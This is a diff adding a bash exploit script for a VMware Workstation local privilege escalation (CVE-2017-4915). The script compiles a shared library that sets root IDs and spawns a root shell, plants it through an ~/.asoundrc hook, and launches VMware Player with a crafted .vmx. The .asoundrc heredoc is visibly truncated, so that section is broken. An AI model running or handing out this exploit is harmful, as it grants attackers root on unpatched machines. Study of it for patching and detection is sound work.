@@ -1,0 +1,128 @@
+#!/bin/bash
+################################################################################
+# VMware Workstation Local Privilege Escalation exploit (CVE-2017-4915)        #
+#  - https://www.vmware.com/security/advisories/VMSA-2017-0009.html            #
+#  - https://www.exploit-db.com/exploits/42045/                                #
+#                                                                              #
+# Affects:                                                                     #
+#  - VMware Workstation Player <= 12.5.5                                       #
+#  - VMware Workstation Pro <= 12.5.5                                          #
+################################################################################
+# ~ bcoles
+
+VM_PLAYER=/usr/bin/vmplayer
+GCC=/usr/bin/gcc
+
+RAND_STR=$(echo $RANDOM | tr '[0-9]' '[a-zA-Z]')
+VM_DIR=$HOME/.$RAND_STR
+
+echo "[*] Creating directory $VM_DIR"
+
+mkdir "$VM_DIR"
+
+if [ $? -ne 0 ] ; then
+  echo "[-] Could not create $VM_DIR"
+  exit 1
+fi
+
+echo "[*] Writing $VM_DIR/$RAND_STR.c"
+
+cat > "$VM_DIR/$RAND_STR.c" <<EOL
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/prctl.h>
+#include <err.h>
+extern char *program_invocation_short_name;
+__attribute__((constructor)) void run(void) {
+  uid_t ruid, euid, suid;
+  if (getresuid(&ruid, &euid, &suid))
+    err(1, "getresuid");
+  printf("[*] Current UIDs: %d %d %d\n", ruid, euid, suid);
+  if (ruid == 0 || euid == 0 || suid == 0) {
+    if (setresuid(0, 0, 0) || setresgid(0, 0, 0))
+      err(1, "setresxid");
+    printf("switched to root UID and GID");
+    system("/bin/bash");
+    _exit(0);
+  }
+}
+EOL
+
+echo "[*] Compiling $VM_DIR/$RAND_STR.c"
+
+$GCC -shared -o "$VM_DIR/$RAND_STR.so" "$VM_DIR/$RAND_STR.c" -fPIC -Wall -ldl -std=gnu99
+
+if [ $? -ne 0 ] ; then
+  echo "[-] Compilation failed"
+  exit 1
+fi
+
+echo "[*] Removing $VM_DIR/$RAND_STR.c"
+rm "$VM_DIR/$RAND_STR.c"
+
+echo "[*] Writing $HOME/.asoundrc"
+  lib "$VM_DIR/$RAND_STR.so"
+  func "conf_pulse_hook_load_if_running"
+}
+EOL
+
+echo "[*] Writing $VM_DIR/$RAND_STR.vmx"
+
+cat > "$VM_DIR/$RAND_STR.vmx" <<EOL
+.encoding = "UTF-8"
+config.version = "8"
+virtualHW.version = "8"
+scsi0.present = "FALSE"
+memsize = "4"
+ide0:0.present = "FALSE"
+sound.present = "TRUE"
+sound.fileName = "-1"
+sound.autodetect = "TRUE"
+vmci0.present = "FALSE"
+hpet0.present = "FALSE"
+displayName = "$RAND_STR"
+guestOS = "other"
+nvram = "$RAND_STR.nvram"
+virtualHW.productCompatibility = "hosted"
+gui.exitOnCLIHLT = "FALSE"
+powerType.powerOff = "soft"
+powerType.powerOn = "soft"
+powerType.suspend = "soft"
+powerType.reset = "soft"
+floppy0.present = "FALSE"
+monitor_control.disable_longmode = 1
+EOL
+
+echo "[*] Disabling VMware hint popups"
+
+if [ ! -d "$HOME/.vmware" ]; then
+  mkdir "$HOME/.vmware"
+fi
+
+if [ -f "$HOME/.vmware/preferences" ]; then
+  if grep -qi "hints.hideall" "$HOME/.vmware/preferences"; then
+    sed -i 's/hints\.hideAll\s*=\s*"FALSE"/hints.hideAll = "TRUE"/i' "$HOME/.vmware/preferences"
+  else
+    echo 'hints.hideAll = "TRUE"' >> "$HOME/.vmware/preferences"
+  fi
+else
+  echo '.encoding = "UTF8"' > "$HOME/.vmware/preferences"
+  echo 'pref.vmplayer.firstRunDismissedVersion = "999"' >> "$HOME/.vmware/preferences"
+  echo 'hints.hideAll = "TRUE"' >> "$HOME/.vmware/preferences"
+fi
+
+echo "[*] Launching VMware Player..."
+$VM_PLAYER "$VM_DIR/$RAND_STR.vmx"
+
+echo "[*] Removing $HOME/.asoundrc"
+rm "$HOME/.asoundrc"
+
+echo "[!] Remove $VM_DIR when you're done"
+rmdir "$VM_DIR"
+
+################################################################################
+# EOF
